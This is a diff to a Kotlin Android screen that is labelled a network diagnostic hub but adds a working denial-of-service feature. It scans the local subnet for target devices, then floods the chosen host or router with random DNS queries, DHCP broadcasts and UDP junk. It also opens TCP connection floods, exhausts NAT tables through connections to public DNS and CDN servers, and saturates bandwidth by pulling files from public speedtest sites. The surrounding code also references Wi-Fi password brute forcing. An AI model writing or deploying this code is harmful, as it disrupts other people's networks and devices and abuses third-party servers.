@@ -1,5 +1,7 @@
 package com.droid.dolphy.network
 
+import com.droid.dolphy.DolphyIconButton
+
 import android.Manifest
 import android.content.Context
 import android.content.Intent
@@ -28,6 +30,7 @@ import androidx.compose.foundation.layout.Spacer
 import androidx.compose.foundation.layout.fillMaxSize
 import androidx.compose.foundation.layout.fillMaxWidth
 import androidx.compose.foundation.layout.height
+import androidx.compose.foundation.layout.heightIn
 import androidx.compose.foundation.layout.navigationBarsPadding
 import androidx.compose.foundation.layout.padding
 import androidx.compose.foundation.layout.size
@@ -94,32 +97,49 @@ import androidx.lifecycle.Lifecycle
 import androidx.lifecycle.LifecycleEventObserver
 import androidx.lifecycle.compose.LocalLifecycleOwner
 import androidx.navigation.NavController
-import com.droid.dolphy.ExpressiveSegmentedCardList
+import com.droid.dolphy.M3SegmentedListItem
+import com.droid.dolphy.M3SegmentedListItemSpacing
 import com.droid.dolphy.MaterialBackground
 import com.droid.dolphy.MaterialCard
-import com.droid.dolphy.MaterialDivider
 import com.droid.dolphy.R
 import com.droid.dolphy.SectionTopBar
 import com.droid.dolphy.SignalRow
 import com.droid.dolphy.TextGray
+import com.droid.dolphy.m3SegmentedItems
 import kotlinx.serialization.Serializable
 import kotlinx.serialization.encodeToString
 import kotlinx.serialization.json.Json
+import java.io.BufferedReader
+import java.io.FileReader
 import java.net.DatagramPacket
 import java.net.DatagramSocket
+import java.net.HttpURLConnection
 import java.net.InetAddress
+import java.net.NetworkInterface
 import java.net.Socket
 import java.net.InetSocketAddress
+import java.net.URL
+import java.nio.ByteBuffer
+import java.nio.ByteOrder
 import java.text.SimpleDateFormat
+import java.util.Collections
 import java.util.Date
 import java.util.Locale
+import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
+import java.util.concurrent.atomic.AtomicLong
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.async
+import kotlinx.coroutines.awaitAll
+import kotlinx.coroutines.coroutineScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import kotlinx.coroutines.yield
 
 private data class HubWifiNetwork(
     val ssid: String,
@@ -138,7 +158,16 @@ private enum class HubDialogStage {
     BruteForce,
     Error,
     AdminPanel,
+    SelectDevice,
 }
+
+private data class HubLanHost(
+    val ip: String,
+    val title: String,
+    val subtitle: String = "",
+    val isGateway: Boolean = false,
+    val isSelf: Boolean = false,
+)
 
 private const val STOCK_GROUP_NAME = "Стоковые пароли"
 
@@ -246,6 +275,10 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
 
     var currentBrutePassword by remember { mutableStateOf("") }
     var showPasswordDialog by remember { mutableStateOf(false) }
+    val lanHosts = remember { mutableStateListOf<HubLanHost>() }
+    var lanScanning by remember { mutableStateOf(false) }
+    var lanScanJob by remember { mutableStateOf<Job?>(null) }
+    var selectedTargetLabel by remember { mutableStateOf("") }
 
     val prefs = remember { context.getSharedPreferences("wifi_passwords", Context.MODE_PRIVATE) }
 
@@ -332,15 +365,20 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
         return try {
             val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
             val dhcpInfo = wifiManager.dhcpInfo
-            val gatewayInt = dhcpInfo.gateway
-            if (gatewayInt != 0) {
-                val gatewayBytes = java.nio.ByteBuffer.allocate(4).order(java.nio.ByteOrder.LITTLE_ENDIAN).putInt(gatewayInt).array()
-                java.net.InetAddress.getByAddress(gatewayBytes).hostAddress
-            } else {
-                null
-            }
+            dhcpIntToIpv4(dhcpInfo.gateway)
         } catch (e: Exception) {
             null
+        }
+    }
+
+    
+    fun getDhcpDnsServers(context: Context): List<String> {
+        return try {
+            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+            val dhcp = wifiManager.dhcpInfo
+            listOfNotNull(dhcpIntToIpv4(dhcp.dns1), dhcpIntToIpv4(dhcp.dns2)).distinct()
+        } catch (_: Exception) {
+            emptyList()
         }
     }
 
@@ -382,77 +420,441 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
         networks.addAll(refreshed)
     }
 
-    fun startContinuousUdpTest(targetSsid: String): kotlinx.coroutines.Job {
+    fun startContinuousUdpTest(targetSsid: String, targetIp: String? = null): Job {
         appendLog(context.getString(R.string.network_hub_log_connected, targetSsid))
-        appendLog(context.getString(R.string.network_hub_log_prepare))
+        val gateway = getGatewayIpAddress(context)
+        val dhcpDns = getDhcpDnsServers(context)
+        val primaryIp = targetIp?.trim()?.takeIf { it.isNotBlank() }
+            ?: gateway
+            ?: "255.255.255.255"
+        val isHostTarget = !targetIp.isNullOrBlank()
+        val isRouterMode = !isHostTarget || primaryIp == gateway
+        if (isHostTarget && !isRouterMode) {
+            appendLog("Подготовка L3/L4 flood → $primaryIp")
+            appendLog("Режим: устройство + DNS/NAT роутера")
+        } else {
+            appendLog(context.getString(R.string.network_hub_log_prepare))
+            appendLog("Режим: роутер — DNS-резолвер + NAT + канал")
+        }
+        if (selectedTargetLabel.isNotBlank()) {
+            appendLog("Цель: $selectedTargetLabel")
+        }
+        if (dhcpDns.isNotEmpty()) {
+            appendLog("DHCP DNS: ${dhcpDns.joinToString()}")
+        }
+
         return scope.launch(Dispatchers.IO) {
-            var packetCount = 0
-            val gatewayIp = getGatewayIpAddress(context) ?: "255.255.255.255"
-            appendLog(context.getString(R.string.network_hub_log_target, gatewayIp))
+            val packetCount = AtomicLong(0)
+            val byteCount = AtomicLong(0)
+            val primaryAddr = runCatching { InetAddress.getByName(primaryIp) }.getOrNull()
+            if (primaryAddr == null) {
+                withContext(Dispatchers.Main) {
+                    appendLog("Не удалось резолвить $primaryIp")
+                }
+                return@launch
+            }
+            val gatewayAddr = gateway?.let { runCatching { InetAddress.getByName(it) }.getOrNull() }
+            val broadcastAddr = runCatching { InetAddress.getByName("255.255.255.255") }.getOrNull()
 
+            val dnsTargets = linkedSetOf<InetAddress>()
+            gatewayAddr?.let { dnsTargets += it }
+            dhcpDns.forEach { ip ->
+                runCatching { InetAddress.getByName(ip) }.getOrNull()?.let { dnsTargets += it }
+            }
+            if (isHostTarget) dnsTargets += primaryAddr
+            if (dnsTargets.isEmpty()) dnsTargets += primaryAddr
+            val dnsList = dnsTargets.toList()
 
-            val targetPorts = listOf(
-                53, 80, 443, 8888, 5353, 1900,
-                22, 23, 25, 110, 143, 389, 445, 3306, 3389, 5432, 6379, 9200, 27017, 50000
+            val externalHosts = listOf(
+                "1.1.1.1", "1.0.0.1", "8.8.8.8", "8.8.4.4",
+                "9.9.9.9", "208.67.222.222", "208.67.220.220",
+                "142.250.190.14",
+                "13.107.21.200",
+                "104.16.132.229",
+                "23.192.228.80",
+                "151.101.1.69",
+            ).mapNotNull { runCatching { InetAddress.getByName(it) }.getOrNull() }
+            val externalPorts = intArrayOf(53, 80, 443, 8080, 8443, 123, 853)
+
+            val bandwidthUrls = listOf(
+                "http://speedtest.tele2.net/10MB.zip",
+                "http://speedtest.tele2.net/1MB.zip",
+                "http://ipv4.download.thinkbroadband.com/5MB.zip",
+                "http://ipv4.download.thinkbroadband.com/10MB.zip",
+                "http://proof.ovh.net/files/1Mb.dat",
+                "http://proof.ovh.net/files/10Mb.dat",
             )
 
+            withContext(Dispatchers.Main) {
+                appendLog(context.getString(R.string.network_hub_log_target, primaryIp))
+                appendLog("DNS targets: ${dnsList.joinToString { it.hostAddress ?: "?" }}")
+                if (isRouterMode) {
+                    appendLog("NAT exhaust → ${externalHosts.size} WAN hosts · bandwidth streams")
+                }
+            }
 
-            val jobs = (1..8).map { threadId ->
+            val localUdpPorts = intArrayOf(53, 67, 68, 123, 1900, 5353, 161, 137, 138)
+            val localTcpPorts = intArrayOf(53, 80, 443, 8080, 8443, 22, 23, 445, 8081, 8888)
+            val httpPaths = listOf("/", "/generate_204", "/hotspot-detect.html", "/ncsi.txt", "/favicon.ico", "/cgi-bin/")
+            val junk = ByteArray(1400) { (it * 31 + 7).toByte() }
+            val dhcpDiscover = buildDhcpDiscover()
+
+            val dnsWorkers = (1..32).map { workerId ->
                 launch {
-                    val random = java.util.Random(threadId.toLong())
-                    while (isActive) {
-                        targetPorts.forEach { port ->
-                            val payloadSize = random.nextInt(1400) + 64
-                            val payload = ByteArray(payloadSize) { random.nextInt().toByte() }
-
-                            val result = runCatching {
-                                DatagramSocket().use { socket ->
-                                    socket.broadcast = true
-                                    socket.sendBufferSize = 65536
-                                    socket.soTimeout = 50
-                                    val address = InetAddress.getByName(gatewayIp)
-                                    val packet = DatagramPacket(payload, payload.size, address, port)
-                                    socket.send(packet)
+                    val random = java.util.Random(workerId.toLong() xor System.nanoTime())
+                    val socket = runCatching {
+                        DatagramSocket().apply {
+                            sendBufferSize = 512 * 1024
+                            soTimeout = 1
+                            reuseAddress = true
+                            broadcast = true
+                        }
+                    }.getOrNull() ?: return@launch
+                    try {
+                        var i = 0
+                        while (isActive) {
+                            val q = buildRandomRecursiveDnsQuery(random)
+                            val dest = dnsList[random.nextInt(dnsList.size)]
+                            runCatching {
+                                socket.send(DatagramPacket(q, q.size, dest, 53))
+                                packetCount.incrementAndGet()
+                                byteCount.addAndGet(q.size.toLong())
+                            }
+                            repeat(3) {
+                                val q2 = buildRandomRecursiveDnsQuery(random)
+                                val d2 = dnsList[random.nextInt(dnsList.size)]
+                                runCatching {
+                                    socket.send(DatagramPacket(q2, q2.size, d2, 53))
+                                    packetCount.incrementAndGet()
+                                    byteCount.addAndGet(q2.size.toLong())
                                 }
                             }
-                            packetCount++
+                            if ((i and 31) == 0) {
+                                runCatching {
+                                    Socket().use { s ->
+                                        s.tcpNoDelay = true
+                                        s.soTimeout = 60
+                                        s.connect(InetSocketAddress(dest, 53), 60)
+                                        val len = ByteBuffer.allocate(2).order(ByteOrder.BIG_ENDIAN)
+                                            .putShort(q.size.toShort()).array()
+                                        val out = s.getOutputStream()
+                                        out.write(len)
+                                        out.write(q)
+                                        out.flush()
+                                    }
+                                    packetCount.incrementAndGet()
+                                }
+                            }
+                            i++
+                            if ((i and 127) == 0) yield()
                         }
-                        delay(1)
+                    } finally {
+                        runCatching { socket.close() }
                     }
                 }
             }
 
+            val udpServiceWorkers = (1..12).map { workerId ->
+                launch {
+                    val random = java.util.Random(workerId + 7000L)
+                    val socket = runCatching {
+                        DatagramSocket().apply {
+                            broadcast = true
+                            sendBufferSize = 256 * 1024
+                            soTimeout = 1
+                            reuseAddress = true
+                        }
+                    }.getOrNull() ?: return@launch
+                    try {
+                        var i = 0
+                        while (isActive) {
+                            val port = localUdpPorts[random.nextInt(localUdpPorts.size)]
+                            val dest = if (port == 67 || port == 68 || port == 1900 || port == 5353) {
+                                broadcastAddr ?: primaryAddr
+                            } else {
+                                primaryAddr
+                            }
+                            val payload = when (port) {
+                                67, 68 -> dhcpDiscover
+                                53 -> buildRandomRecursiveDnsQuery(random)
+                                else -> junk
+                            }
+                            val len = if (port == 67 || port == 68) payload.size else minOf(payload.size, 512 + random.nextInt(800))
+                            runCatching {
+                                socket.send(DatagramPacket(payload, len, dest, port))
+                                packetCount.incrementAndGet()
+                                byteCount.addAndGet(len.toLong())
+                            }
+                            if (gatewayAddr != null && (i and 1) == 0) {
+                                val q = buildRandomRecursiveDnsQuery(random)
+                                runCatching {
+                                    socket.send(DatagramPacket(q, q.size, gatewayAddr, 53))
+                                    packetCount.incrementAndGet()
+                                }
+                            }
+                            i++
+                            if ((i and 127) == 0) yield()
+                        }
+                    } finally {
+                        runCatching { socket.close() }
+                    }
+                }
+            }
 
-            launch {
-                val tcpPorts = listOf(80, 443, 8080, 3306, 5432)
-                val random = java.util.Random()
-                while (isActive) {
-                    tcpPorts.forEach { port ->
-                        runCatching {
-                            Socket().use { socket ->
-                                socket.soTimeout = 50
-                                socket.connect(InetSocketAddress(gatewayIp, port), 100)
-                                socket.getOutputStream().write(ByteArray(random.nextInt(512) + 64))
+            val natWorkers = (1..if (isRouterMode) 28 else 12).map { workerId ->
+                launch {
+                    val random = java.util.Random(workerId + 9000L)
+                    val held = ArrayDeque<Socket>(64)
+                    try {
+                        while (isActive) {
+                            if (held.size > 48) {
+                                runCatching { held.removeFirst().close() }
+                            }
+                            val host = if (externalHosts.isNotEmpty()) {
+                                externalHosts[random.nextInt(externalHosts.size)]
+                            } else {
+                                primaryAddr
+                            }
+                            val port = externalPorts[random.nextInt(externalPorts.size)]
+                            runCatching {
+                                val s = Socket()
+                                s.tcpNoDelay = true
+                                s.soTimeout = 120
+                                s.connect(InetSocketAddress(host, port), 150)
+                                val out = s.getOutputStream()
+                                when (port) {
+                                    80, 8080 -> {
+                                        out.write(
+                                            ("GET / HTTP/1.1\r\nHost: ${host.hostAddress}\r\n" +
+                                                "Connection: keep-alive\r\n\r\n").toByteArray(),
+                                        )
+                                        out.flush()
+                                        if (random.nextBoolean()) {
+                                            held.addLast(s)
+                                        } else {
+                                            s.close()
+                                        }
+                                    }
+                                    443, 8443, 853 -> {
+                                        out.write(junk, 0, 200)
+                                        out.flush()
+                                        if (random.nextInt(3) == 0) held.addLast(s) else s.close()
+                                    }
+                                    else -> {
+                                        out.write(junk, 0, 64)
+                                        out.flush()
+                                        s.close()
+                                    }
+                                }
+                                packetCount.incrementAndGet()
                             }
                         }
-                        packetCount++
+                    } finally {
+                        held.forEach { runCatching { it.close() } }
+                        held.clear()
                     }
-                    delay(2)
                 }
             }
 
+            val localTcpWorkers = (1..if (isRouterMode) 10 else 16).map { workerId ->
+                launch {
+                    val random = java.util.Random(workerId + 3000L)
+                    while (isActive) {
+                        val port = localTcpPorts[random.nextInt(localTcpPorts.size)]
+                        runCatching {
+                            Socket().use { socket ->
+                                socket.tcpNoDelay = true
+                                socket.soTimeout = 80
+                                socket.connect(InetSocketAddress(primaryAddr, port), 100)
+                                val out = socket.getOutputStream()
+                                if (port == 80 || port == 8080 || port == 8008 || port == 8888) {
+                                    val path = httpPaths[random.nextInt(httpPaths.size)]
+                                    out.write(
+                                        ("GET $path HTTP/1.1\r\nHost: $primaryIp\r\n" +
+                                            "Connection: close\r\n\r\n").toByteArray(),
+                                    )
+                                } else if (port == 443 || port == 8443) {
+                                    out.write(junk, 0, 200)
+                                } else {
+                                    out.write(junk, 0, 128)
+                                }
+                                out.flush()
+                            }
+                        }
+                        packetCount.incrementAndGet()
+                    }
+                }
+            }
+
+            val bwWorkers = (1..if (isRouterMode) 8 else 3).map { workerId ->
+                launch {
+                    val random = java.util.Random(workerId + 11000L)
+                    val buf = ByteArray(64 * 1024)
+                    while (isActive) {
+                        val urlStr = bandwidthUrls[random.nextInt(bandwidthUrls.size)]
+                        runCatching {
+                            val conn = (URL(urlStr).openConnection() as HttpURLConnection).apply {
+                                connectTimeout = 2500
+                                readTimeout = 4000
+                                instanceFollowRedirects = true
+                                useCaches = false
+                                requestMethod = "GET"
+                                setRequestProperty("User-Agent", "DolphyBW/$workerId")
+                                setRequestProperty("Connection", "close")
+                                setRequestProperty("Accept-Encoding", "identity")
+                            }
+                            try {
+                                val code = conn.responseCode
+                                if (code in 200..399) {
+                                    conn.inputStream.use { input ->
+                                        while (isActive) {
+                                            val n = input.read(buf)
+                                            if (n <= 0) break
+                                            byteCount.addAndGet(n.toLong())
+                                            packetCount.incrementAndGet()
+                                        }
+                                    }
+                                }
+                            } finally {
+                                conn.disconnect()
+                            }
+                        }
+                    }
+                }
+            }
 
             launch {
+                var lastPkts = 0L
+                var lastBytes = 0L
+                var lastTs = System.currentTimeMillis()
                 while (isActive) {
                     delay(500)
+                    val now = System.currentTimeMillis()
+                    val pkts = packetCount.get()
+                    val bytes = byteCount.get()
+                    val dt = (now - lastTs).coerceAtLeast(1)
+                    val pps = ((pkts - lastPkts) * 1000L) / dt
+                    val mbps = ((bytes - lastBytes) * 8.0 / dt / 1000.0)
+                    lastPkts = pkts
+                    lastBytes = bytes
+                    lastTs = now
                     withContext(Dispatchers.Main) {
-                        appendLog(context.getString(R.string.network_hub_log_flood, packetCount))
+                        appendLog(
+                            "flood: $pkts ops · ${pps}/s · ${"%.1f".format(Locale.US, mbps)} Mbps",
+                        )
                     }
                 }
             }
 
+            (dnsWorkers + udpServiceWorkers + natWorkers + localTcpWorkers + bwWorkers)
+                .forEach { it.join() }
+        }
+    }
 
-            jobs.forEach { it.join() }
+    fun startLanDeviceScan() {
+        lanScanJob?.cancel()
+        lanHosts.clear()
+        lanScanning = true
+        lanScanJob = scope.launch(Dispatchers.IO) {
+            val hosts = linkedMapOf<String, HubLanHost>()
+            val gateway = getGatewayIpAddress(context)
+            val self = getHubLocalIpv4()
+
+            if (gateway != null) {
+                hosts[gateway] = HubLanHost(
+                    ip = gateway,
+                    title = "Шлюз / роутер",
+                    subtitle = "DNS · DHCP · интернет",
+                    isGateway = true,
+                )
+            }
+            if (self != null) {
+                hosts[self] = HubLanHost(
+                    ip = self,
+                    title = "Это устройство",
+                    subtitle = "вы",
+                    isSelf = true,
+                )
+            }
+            readArpTable().forEach { (ip, mac) ->
+                if (!hosts.containsKey(ip)) {
+                    hosts[ip] = HubLanHost(ip, ip, "MAC $mac")
+                } else {
+                    val old = hosts[ip]!!
+                    if (old.subtitle.isBlank()) {
+                        hosts[ip] = old.copy(subtitle = "MAC $mac")
+                    }
+                }
+            }
+            withContext(Dispatchers.Main) {
+                lanHosts.clear()
+                lanHosts.addAll(hosts.values.sortedWith(compareByDescending<HubLanHost> { it.isGateway }.thenBy { it.ip }))
+            }
+
+            val subnet = self?.substringBeforeLast('.') ?: gateway?.substringBeforeLast('.')
+            if (subnet != null) {
+                coroutineScope {
+                    val jobs = (1..254).map { i ->
+                        async(Dispatchers.IO) {
+                            val ip = "$subnet.$i"
+                            if (hosts.containsKey(ip)) return@async null
+                            val alive = runCatching {
+                                val addr = InetAddress.getByName(ip)
+                                addr.isReachable(180) || quickPortOpen(ip, 80, 60) || quickPortOpen(ip, 443, 60) ||
+                                    quickPortOpen(ip, 53, 40) || quickPortOpen(ip, 22, 40) || quickPortOpen(ip, 445, 40)
+                            }.getOrDefault(false)
+                            if (!alive) return@async null
+                            val name = runCatching {
+                                val c = InetAddress.getByName(ip).canonicalHostName
+                                if (c != null && c != ip) c else null
+                            }.getOrNull()
+                            HubLanHost(
+                                ip = ip,
+                                title = name ?: ip,
+                                subtitle = if (name != null) ip else "online",
+                            )
+                        }
+                    }
+                    jobs.chunked(32).forEach { chunk ->
+                        if (!isActive) return@coroutineScope
+                        val found = chunk.awaitAll().filterNotNull()
+                        if (found.isNotEmpty()) {
+                            found.forEach { hosts[it.ip] = it }
+                            withContext(Dispatchers.Main) {
+                                lanHosts.clear()
+                                lanHosts.addAll(
+                                    hosts.values.sortedWith(
+                                        compareByDescending<HubLanHost> { it.isGateway }
+                                            .thenBy { it.isSelf }
+                                            .thenBy { it.ip.substringAfterLast('.').toIntOrNull() ?: 0 },
+                                    ),
+                                )
+                            }
+                        }
+                    }
+                }
+            }
+            readArpTable().forEach { (ip, mac) ->
+                val old = hosts[ip]
+                if (old != null && !old.subtitle.contains("MAC")) {
+                    hosts[ip] = old.copy(subtitle = listOf(old.subtitle, "MAC $mac").filter { it.isNotBlank() }.joinToString(" · "))
+                } else if (old == null) {
+                    hosts[ip] = HubLanHost(ip, ip, "MAC $mac")
+                }
+            }
+            withContext(Dispatchers.Main) {
+                lanHosts.clear()
+                lanHosts.addAll(
+                    hosts.values
+                        .filter { !it.isSelf }
+                        .sortedWith(
+                            compareByDescending<HubLanHost> { it.isGateway }
+                                .thenBy { it.ip.substringAfterLast('.').toIntOrNull() ?: 0 },
+                        ),
+                )
+                lanScanning = false
+                appendLog("Найдено устройств: ${lanHosts.size}")
+            }
         }
     }
 
@@ -534,8 +936,10 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
     fun closeDialog() {
         udpSendJob?.cancel()
         bruteForceJob?.cancel()
+        lanScanJob?.cancel()
         udpSendJob = null
         bruteForceJob = null
+        lanScanJob = null
         dialogStage = null
         dialogNetwork = null
         countdown = 3
@@ -543,16 +947,21 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
         sendLogs.clear()
         bruteForceSuccess = false
         foundPassword = ""
+        selectedTargetLabel = ""
+        lanHosts.clear()
+        lanScanning = false
     }
 
-    fun startActiveNetworkTest(network: HubWifiNetwork) {
+    fun startActiveNetworkTest(network: HubWifiNetwork, targetIp: String? = null, label: String = "") {
         udpSendJob?.cancel()
         udpSendJob = null
+        lanScanJob?.cancel()
         dialogNetwork = network
+        selectedTargetLabel = label
         dialogStage = HubDialogStage.Started
         launchedWifiSettings = false
         sendLogs.clear()
-        udpSendJob = startContinuousUdpTest(network.ssid)
+        udpSendJob = startContinuousUdpTest(network.ssid, targetIp)
     }
 
     LaunchedEffect(wifiPermissionsGranted, locationServicesEnabled) {
@@ -628,7 +1037,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                     title = stringResource(R.string.network_hub_title),
                     onBack = { navController.popBackStack() },
                     actions = {
-                        IconButton(onClick = { showPasswordDialog = true }) {
+                        DolphyIconButton(onClick = { showPasswordDialog = true }) {
                             Icon(Icons.Filled.VpnKey, contentDescription = stringResource(R.string.wifi_brute_force_passwords), tint = MaterialTheme.colorScheme.primary)
                         }
                     }
@@ -682,54 +1091,51 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                 }
 
                 LazyColumn(
-                    modifier = Modifier.fillMaxSize(),
-                    verticalArrangement = Arrangement.spacedBy(12.dp),
-                    contentPadding = PaddingValues(bottom = 20.dp)
+                    modifier = Modifier
+                        .fillMaxSize()
+                        .padding(horizontal = 16.dp),
+                    verticalArrangement = Arrangement.spacedBy(M3SegmentedListItemSpacing),
+                    contentPadding = PaddingValues(bottom = 20.dp, top = 8.dp),
                 ) {
-                    items(networks) { network ->
-                        MaterialCard(
-                            modifier = Modifier.fillMaxWidth(),
-                            accentColor = if (network.isActive) MaterialTheme.colorScheme.primary else Color(0xFFD32F2F),
-                            cornerRadius = 16.dp,
-                            contentPadding = 0.dp
-                        ) {
-                            SignalRow(
-                                title = network.ssid,
-                                description = if (network.isActive) stringResource(R.string.network_hub_active_pinned)
-                                else "${network.frequencyMhz} MHz • ${network.level} dBm",
-                                icon = Icons.Default.Wifi,
-                                accentColor = if (network.isActive) MaterialTheme.colorScheme.primary else Color(0xFFD32F2F),
-                                onClick = {
-                                    haptics.performHapticFeedback(androidx.compose.ui.hapticfeedback.HapticFeedbackType.LongPress)
-                                    if (!wifiPermissionsGranted) {
-                                        wifiPermissionLauncher.launch(requiredWifiPermissions())
-                                    } else if (!locationServicesEnabled) {
-                                        showLocationServicesDialog = true
-                                    } else {
-
-                                        dialogNetwork = network
-                                        dialogStage = HubDialogStage.Menu
-                                    }
-                                },
-                                trailingContent = {
-                                    if (network.isActive) {
-                                        Icon(
-                                            Icons.Filled.CheckCircle,
-                                            null,
-                                            tint = MaterialTheme.colorScheme.primary,
-                                            modifier = Modifier.size(20.dp)
-                                        )
-                                    } else {
-                                        Icon(
-                                            Icons.Default.ChevronRight,
-                                            null,
-                                            tint = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.4f),
-                                            modifier = Modifier.size(20.dp)
-                                        )
-                                    }
+                    m3SegmentedItems(networks.toList()) { index, count, network ->
+                        val active = network.isActive
+                        val tint = if (active) MaterialTheme.colorScheme.primary else Color(0xFFD32F2F)
+                        M3SegmentedListItem(
+                            index = index,
+                            count = count,
+                            headline = network.ssid,
+                            supporting = if (active) {
+                                stringResource(R.string.network_hub_active_pinned)
+                            } else {
+                                "${network.frequencyMhz} MHz • ${network.level} dBm"
+                            },
+                            leadingIcon = Icons.Default.Wifi,
+                            leadingIconTint = tint,
+                            selected = active,
+                            trailingContent = {
+                                if (active) {
+                                    Icon(
+                                        Icons.Filled.CheckCircle,
+                                        null,
+                                        tint = MaterialTheme.colorScheme.primary,
+                                        modifier = Modifier.size(20.dp),
+                                    )
                                 }
-                            )
-                        }
+                            },
+                            onClick = {
+                                haptics.performHapticFeedback(
+                                    androidx.compose.ui.hapticfeedback.HapticFeedbackType.LongPress,
+                                )
+                                if (!wifiPermissionsGranted) {
+                                    wifiPermissionLauncher.launch(requiredWifiPermissions())
+                                } else if (!locationServicesEnabled) {
+                                    showLocationServicesDialog = true
+                                } else {
+                                    dialogNetwork = network
+                                    dialogStage = HubDialogStage.Menu
+                                }
+                            },
+                        )
                     }
 
                     item {
@@ -814,6 +1220,24 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
 
                             MaterialCard(
                                 modifier = Modifier.fillMaxWidth(),
+                                accentColor = Color(0xFFFF6D00),
+                                cornerRadius = 12.dp,
+                                contentPadding = 0.dp
+                            ) {
+                                SignalRow(
+                                    title = "DoS устройства",
+                                    description = "DoS конкретного устройства в сети",
+                                    icon = Icons.Default.WifiOff,
+                                    accentColor = Color(0xFFFF6D00),
+                                    onClick = {
+                                        dialogStage = HubDialogStage.SelectDevice
+                                        startLanDeviceScan()
+                                    }
+                                )
+                            }
+
+                            MaterialCard(
+                                modifier = Modifier.fillMaxWidth(),
                                 accentColor = Color(0xFFF44336),
                                 cornerRadius = 12.dp,
                                 contentPadding = 0.dp
@@ -848,6 +1272,144 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
 
                             TextButton(onClick = { closeDialog() }, modifier = Modifier.fillMaxWidth()) {
                                 Text(stringResource(R.string.cancel))
+                            }
+                        }
+                    }
+
+                    HubDialogStage.SelectDevice -> {
+                        Column(
+                            modifier = Modifier
+                                .padding(20.dp)
+                                .fillMaxWidth()
+                                .heightIn(min = 280.dp, max = 520.dp),
+                            verticalArrangement = Arrangement.spacedBy(12.dp)
+                        ) {
+                            Text(
+                                text = "DoS устройства",
+                                style = MaterialTheme.typography.headlineSmall,
+                                fontWeight = FontWeight.Bold,
+                            )
+                            Text(
+                                text = "Выберите устройство в сети «${currentDialogNetwork.ssid}»",
+                                style = MaterialTheme.typography.bodyMedium,
+                                color = MaterialTheme.colorScheme.onSurfaceVariant,
+                            )
+                            if (lanScanning) {
+                                Row(
+                                    verticalAlignment = Alignment.CenterVertically,
+                                    horizontalArrangement = Arrangement.spacedBy(10.dp),
+                                ) {
+                                    CircularProgressIndicator(modifier = Modifier.size(18.dp), strokeWidth = 2.dp)
+                                    Text(
+                                        "Сканирование сети… ${lanHosts.size}",
+                                        style = MaterialTheme.typography.labelLarge,
+                                        color = MaterialTheme.colorScheme.primary,
+                                    )
+                                }
+                            } else {
+                                Text(
+                                    "Найдено: ${lanHosts.size}",
+                                    style = MaterialTheme.typography.labelLarge,
+                                    color = MaterialTheme.colorScheme.onSurfaceVariant,
+                                )
+                            }
+                            Surface(
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .weight(1f, fill = true)
+                                    .heightIn(min = 160.dp, max = 340.dp),
+                                shape = RoundedCornerShape(16.dp),
+                                color = MaterialTheme.colorScheme.surfaceContainerHigh,
+                            ) {
+                                if (lanHosts.isEmpty() && !lanScanning) {
+                                    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                                        Text(
+                                            "Устройства не найдены.\nПодключитесь к этой Wi‑Fi сети.",
+                                            textAlign = TextAlign.Center,
+                                            color = MaterialTheme.colorScheme.onSurfaceVariant,
+                                        )
+                                    }
+                                } else {
+                                    LazyColumn(
+                                        modifier = Modifier.fillMaxSize(),
+                                        contentPadding = PaddingValues(8.dp),
+                                        verticalArrangement = Arrangement.spacedBy(6.dp),
+                                    ) {
+                                        items(lanHosts.size) { index ->
+                                            val host = lanHosts[index]
+                                            Surface(
+                                                onClick = {
+                                                    startActiveNetworkTest(
+                                                        currentDialogNetwork,
+                                                        host.ip,
+                                                        label = "${host.title} (${host.ip})",
+                                                    )
+                                                },
+                                                shape = RoundedCornerShape(12.dp),
+                                                color = if (host.isGateway) {
+                                                    MaterialTheme.colorScheme.primaryContainer
+                                                } else {
+                                                    MaterialTheme.colorScheme.surface
+                                                },
+                                                modifier = Modifier.fillMaxWidth(),
+                                            ) {
+                                                Row(
+                                                    Modifier
+                                                        .fillMaxWidth()
+                                                        .padding(horizontal = 14.dp, vertical = 12.dp),
+                                                    verticalAlignment = Alignment.CenterVertically,
+                                                    horizontalArrangement = Arrangement.SpaceBetween,
+                                                ) {
+                                                    Column(Modifier.weight(1f)) {
+                                                        Text(
+                                                            host.title,
+                                                            style = MaterialTheme.typography.titleSmall,
+                                                            fontWeight = FontWeight.SemiBold,
+                                                        )
+                                                        Text(
+                                                            buildString {
+                                                                append(host.ip)
+                                                                if (host.subtitle.isNotBlank() && host.subtitle != host.ip) {
+                                                                    append(" · ")
+                                                                    append(host.subtitle)
+                                                                }
+                                                            },
+                                                            style = MaterialTheme.typography.bodySmall,
+                                                            color = MaterialTheme.colorScheme.onSurfaceVariant,
+                                                        )
+                                                    }
+                                                    Icon(
+                                                        Icons.Default.FlashOn,
+                                                        contentDescription = null,
+                                                        tint = if (host.isGateway) {
+                                                            MaterialTheme.colorScheme.primary
+                                                        } else {
+                                                            Color(0xFFFF6D00)
+                                                        },
+                                                    )
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                            Row(
+                                Modifier.fillMaxWidth(),
+                                horizontalArrangement = Arrangement.spacedBy(8.dp),
+                            ) {
+                                TextButton(
+                                    onClick = { dialogStage = HubDialogStage.Menu; lanScanJob?.cancel() },
+                                    modifier = Modifier.weight(1f),
+                                ) {
+                                    Text(stringResource(R.string.cancel))
+                                }
+                                FilledTonalButton(
+                                    onClick = { startLanDeviceScan() },
+                                    enabled = !lanScanning,
+                                    modifier = Modifier.weight(1f),
+                                ) {
+                                    Text("Обновить")
